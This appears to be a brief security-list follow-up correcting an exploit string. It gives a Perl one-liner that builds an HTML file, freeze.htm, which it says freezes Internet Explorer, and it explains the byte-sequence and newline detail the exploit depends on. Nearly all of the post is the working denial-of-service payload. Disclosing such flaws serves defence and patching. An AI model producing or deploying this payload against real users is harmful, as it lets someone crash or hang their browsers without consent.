 This string works only with Active Perl, in unix-like Perl versions exploit
string is:
 perl -e "print qq'\xFF\xFE'; print qq'\r\r\n' x 30000" > freeze.htm
 Active Perl understand \n = \x0D\x0A, freeze of  IE exist only if sequence
 of bytes will be ...\x0D\x0D\x0A...
 Sorry, I have not noticed it at once.
